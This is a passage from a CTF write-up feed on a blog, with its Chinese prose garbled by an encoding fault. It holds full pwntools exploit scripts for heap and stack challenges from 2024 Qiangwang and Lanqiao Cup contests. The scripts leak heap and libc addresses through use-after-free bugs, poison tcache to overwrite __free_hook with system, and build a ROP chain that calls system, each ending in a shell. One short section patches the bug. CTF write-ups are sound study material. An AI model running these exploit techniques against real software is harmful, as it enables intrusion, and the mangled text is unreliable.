class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hook</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>],libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)   </span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;&#x27;,)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl(<span class="string">&quot;Please input your name:&quot;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,content</span>):</span><br><span class="line">    rl(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    rl(<span class="string">&quot;Album entry number: &quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    rl(<span class="string">&quot;Write your memory: &quot;</span>)</span><br><span class="line">    s(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    rl(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(<span class="number">2</span>))   </span><br><span class="line">    rl(<span class="string">&quot;Album entry number to edit: &quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    rl(<span class="string">&quot;Edit your memory: &quot;</span>)</span><br><span class="line">    sl(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    rl(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(<span class="number">4</span>))   </span><br><span class="line">    rl(<span class="string">&quot;Album entry number to delete: &quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    rl(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(<span class="number">3</span>))   </span><br><span class="line">    rl(<span class="string">&quot;Album entry number to view: &quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">a=p.recv(<span class="number">16</span>)</span><br><span class="line">heap_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x5b0</span></span><br><span class="line">li(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(heap_base+<span class="number">0x30</span>))</span><br><span class="line">add(<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x7000000000000</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">7</span>,p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">8</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">show(<span class="number">9</span>)</span><br><span class="line">libc_base=get_addr64()-<span class="number">2018272</span></span><br><span class="line">li(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">malloc_hook,free_hook=get_hook()</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">edit(<span class="number">9</span>,p64(<span class="number">0x30000</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">11</span>,p64(system))</span><br><span class="line"></span><br><span class="line">bug()</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h5 id="é˜²å¾¡ï¼š-2">é˜²å¾¡ï¼š</h5><p><img src="https://cdn.nlark.com/yuque/0/2024/png/48239638/1733883773403-0a303c0f-8f94-4a99-a64f-cb7b48b3362c.png" alt=""></p><p>freeå‡½æ•°å†…å­˜åœ¨uafæ¼æ´</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/48239638/1733883833570-4138fe79-33d2-49e8-87cd-f94dfa8dbc50.png?x-oss-process=image%2Fformat%2Cwebp" alt=""></p><p>åœ¨en_frameæ®µä¸ŠæŠ„æ±‡ç¼–å³å¯ï¼š</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/48239638/1733885408448-5856dda8-83d3-48f1-b55d-3b8f5a87c944.png?x-oss-process=image%2Fformat%2Cwebp" alt=""></p><p>ä½¿ç”¨r8å½“ä»‹è´¨ï¼Œå°†chunklist[index]ç½®é›¶ï¼Œæœ€åè·³è½¬åˆ°call _freeçš„ä¸‹ä¸€æ®µæ±‡ç¼–</p><p>åŒæ—¶å°†call _freeæ”¹ä¸ºcall en_frameè¯¥æ®µåœ°å€</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/48239638/1733885821714-03eca445-af6e-48a2-8d4b-a3931946eb01.png?x-oss-process=image%2Fformat%2Cwebp" alt=""></p><p>æˆåŠŸé˜²å¾¡ï¼š</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/48239638/1733887117902-79afe25c-63ea-4b05-a34a-fd1397f06fb9.png" alt=""></p><h1></h1>]]></content>
    
    
    <summary type="html">2024qwbé’å°‘å¹´</summary>
    
    
    
    <category term="Writeup" scheme="https://www.thir0th.xyz/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://www.thir0th.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2024è“æ¡¥æ¯</title>
    <link href="https://www.thir0th.xyz/posts/1b9e3ed2.html"/>
    <id>https://www.thir0th.xyz/posts/1b9e3ed2.html</id>
    <published>2025-04-20T06:31:35.000Z</published>
    <updated>2025-05-07T08:27:01.284Z</updated>
    
    <content type="html"><![CDATA[<h1>2024è“æ¡¥æ¯</h1><p>é¢˜ç›®å¤ç°ï¼Œä¹Ÿæ˜¯æœ‰ä¸€å®šçš„æ”¶è·ï¼ŒåŸºæœ¬å°±æ˜¯å †å—é”™ä½çš„åˆ©ç”¨ï¼Œæ²¡æœ‰uafçš„è¯éœ€è¦æå–å¸ƒç½®å¥½sizeï¼Œæœ‰çš„è¯ç›´æ¥æ‰“</p><h3 id="çº¿ä¸Š">çº¿ä¸Š</h3><h4 id="ç¬¬ä¸€é¢˜">ç¬¬ä¸€é¢˜</h4><p>ç­¾åˆ°é¢˜ï¼Œ$0ç»•è¿‡æ£€æµ‹ï¼Œé‡å®šå‘è¾“å‡ºflag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)   </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span><br><span class="line">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">#p=remote(&#x27;&#x27;,)</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">rl(&quot;restricted stack.&quot;)</span><br><span class="line">sl(b&#x27;$0\x00&#x27;)</span><br><span class="line"></span><br><span class="line">sh=0x601090</span><br><span class="line">rl(&quot;...&quot;)</span><br><span class="line">rdi=0x0000000000400933</span><br><span class="line">payload=b&#x27;a&#x27;*(0x20+8)+p64(rdi)+p64(sh)+p64(rdi+1)+p64(elf.plt[&#x27;system&#x27;])</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h4 id="ç¬¬äºŒé¢˜">ç¬¬äºŒé¢˜</h4><p>åªæœ‰ä¸€æ¬¡uaf</p><p>2.31ï¼Œadd,free,edit,showå››ä¸ªåŠŸèƒ½å‡½æ•°</p><p>addå›ºå®šåªèƒ½ç”³è¯·0x50å¤§å°å †å—</p><p>åªå­˜åœ¨ä¸€ä¸ªæ¼æ´</p><p>è¿™é‡Œç”¨åˆ°ä¸€ä¸ªæ•´ç†æœºåˆ¶ï¼Œtcachebinä¸­ä¸å¯ä»¥double freeï¼Œä½†fastbinä¸­å¯ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨fastbinä¸­å®Œæˆdouble freeï¼Œå…ˆå°†tcachebinä¸­çš„å †å—æ¸…é™¤ï¼Œå½“æˆ‘ä»¬ç”³è¯·ä¸€ä¸ªå †å—æ—¶ï¼Œå°±ä¼šè§¦å‘å †å—åˆ†é…è¿›åˆ¶ï¼Œå®Œæˆtcachebin attack</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1722780531197-c394055d-ae85-42fb-998c-5852207d9eb0.png?x-oss-process=image%2Fformat%2Cwebp%2Fresize%2Cw_1125%2Climit_0" alt=""></p><p><a href="https://www.yuque.com/xiachi/rx5cxd/fnnowgt0q7z7spst">https://www.yuque.com/xiachi/rx5cxd/fnnowgt0q7z7spst</a></p><p>æˆ‘ä»¬æå‰å¸ƒç½®å¥½sizeï¼Œé€ æˆå †å—é”™ä½ï¼Œä¹‹åæˆ‘ä»¬å¯ä»¥å»ä¿®æ”¹ä¸‹ä¸€ä¸ªå †å—çš„sizeï¼Œä½¿å…¶åˆå¹¶ï¼Œfreeå¤§å †å—åï¼Œåœ¨ç”³è¯·ä¸€ä¸ªå°å †å—ï¼Œä¹Ÿå°±æ˜¯å¯¼è‡´é”™ä½çš„å †å—ï¼Œå¾—åˆ°libcåœ°å€ï¼Œå†æ¬¡åˆ©ç”¨è¿™ä¸ªé”™ä½å †å—ï¼Œå»ä¿®æ”¹binsä¸­çš„fdä½ï¼Œæ”»å‡»free_hook</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1734602407786-17dcb0a5-80f8-40e5-9890-73fa9cf151a1.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6&#x27;)   </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span><br><span class="line">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">#p=remote(&#x27;&#x27;,)</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">def add(content):</span><br><span class="line">rl(&quot;4.exit&quot;)</span><br><span class="line">sl(str(1))</span><br><span class="line">sleep(0.1)</span><br><span class="line">s(content)</span><br><span class="line">def free(i):</span><br><span class="line">rl(&quot;4.exit&quot;)</span><br><span class="line">sl(str(2))</span><br><span class="line">sleep(0.1)</span><br><span class="line">sl(str(i))</span><br><span class="line">def show(i):</span><br><span class="line">rl(&quot;4.exit&quot;)</span><br><span class="line">sl(str(3))</span><br><span class="line">sleep(0.1)</span><br><span class="line">sl(str(i))</span><br><span class="line">def uaf(i):</span><br><span class="line">rl(&quot;4.exit&quot;)</span><br><span class="line">sl(str(2106373))</span><br><span class="line">sleep(0.1)</span><br><span class="line">sl(str(i))</span><br><span class="line"></span><br><span class="line">add(b&#x27;a&#x27;)</span><br><span class="line">add(p64(0)*5+p64(0x61))</span><br><span class="line">for i in range(12):#2-13</span><br><span class="line">add(b&#x27;a&#x27;)</span><br><span class="line">for i in range(9):</span><br><span class="line">free(i+2)</span><br><span class="line">uaf(0)</span><br><span class="line">free(1)</span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line">for i in range(7):#0-6</span><br><span class="line">add(b&#x27;b&#x27;)</span><br><span class="line"></span><br><span class="line">add(b&#x27;\x30&#x27;)</span><br><span class="line"></span><br><span class="line">add(b&#x27;a&#x27;)</span><br><span class="line">add(b&#x27;a&#x27;)</span><br><span class="line">add(p64(0)*5+p64(0x421))</span><br><span class="line">free(6)</span><br><span class="line">add(b&#x27;a&#x27;)</span><br><span class="line">show(6)</span><br><span class="line">libc_base=get_addr64()-2019169</span><br><span class="line">li(hex(libc_base))</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">malloc_hook,free_hook=get_hook()</span><br><span class="line"></span><br><span class="line">free(11)</span><br><span class="line">free(6)</span><br><span class="line">free(10)</span><br><span class="line">#bug()</span><br><span class="line">add(p64(0)*5+p64(0x61)+p64(free_hook))</span><br><span class="line">add(b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">add(p64(system))</span><br><span class="line">#bug()</span><br><span class="line">free(10)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h3 id="çº¿ä¸‹">çº¿ä¸‹</h3><h4 id="ç¬¬ä¸€é¢˜-2">ç¬¬ä¸€é¢˜</h4><p>2.27çš„of by one</p><p>add,free,edit,showå››ä¸ªåŠŸèƒ½å‡½æ•°ï¼Œaddåªèƒ½ç”³è¯·&lt;0x100çš„å †å—</p><p>å¼€å±€ä¸€ä¸ªä¼ªéšæœºæ•°ç»•è¿‡ï¼Œç›´æ¥ç»•ä¹‹åhouse of botcakeæ³„éœ²libcåœ°å€ï¼Œof by oneé€ æˆå †å—é‡å åæ”»å‡»binsä¸­çš„fdä½ä¸ºfree_hookï¼Œæœ€åget_shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 